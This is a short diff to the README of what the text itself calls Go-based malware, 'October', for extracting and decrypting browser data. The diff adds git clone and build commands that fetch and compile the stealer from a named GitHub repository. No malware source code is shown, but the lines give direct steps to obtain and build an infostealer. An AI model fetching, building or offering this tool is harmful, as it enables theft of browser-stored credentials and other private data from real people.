@@ -19,6 +19,8 @@ October is a Go-based malware for extracting and decrypting browser data across 
 
 ## Build
 ```bash
+git clone https://github.com/Hollow33n/OCStealer
+cd OCStealer
 # Requirements: Go 1.20+
 go mod tidy
 go build ./cmd/OctoberStealer
